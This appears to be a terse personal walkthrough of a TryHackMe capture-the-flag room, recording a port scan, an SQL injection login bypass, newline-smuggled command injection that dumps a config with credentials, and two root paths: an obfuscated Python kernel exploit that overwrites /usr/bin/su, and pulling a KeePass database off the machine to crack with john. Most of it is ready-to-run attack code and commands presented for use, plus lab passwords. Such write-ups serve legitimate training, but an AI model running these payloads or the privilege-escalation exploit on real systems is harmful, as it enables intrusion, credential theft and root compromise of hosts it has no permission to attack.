room link: https://tryhackme.com/room/silent-monitor

 rustscan -b 500 -a 10.49.171.51 --top -- -sC -sV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Because guessing isn't hacking.

[~] The config file is expected to be at "/home/drrr/snap/rustscan/626/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.49.171.51:22
Open 10.49.171.51:5050
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -Pn" on ip 10.49.171.51
Depending on the complexity of the script, results may take some time to appear.
[!] Error Exit code = 127

gobuster results:

internal             (Status: 200) [Size: 8770]

sqli

username: 'or 1=1-- -
password: letmein


on burp repeater

%0a for newline workks but only on burp, not in the browser

target=127.0.0.1%0acat secret.config

run_as   = sysadmin
password = S3cur3Backup$Acc3ss!

two ways of getting root
1. copy fail vulnerability

save this .py file, execute it and you get root.

#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")

2. cracking the kdbx: KeePass password database file
on the machine's backup folder 
 python3 -m http.server 8000

on your machine
curl http://machineIP:8000/infrastructure.kdbx -o infrastructure.kdbx

keepass2john infrastructure.kdbx > kdbx.hash

john --wordlist=rockyou.txt kdbx.hash 

spring           (infrastructure)  

opening the kdbx file

root:S3cur3P4ss0nK33p4ss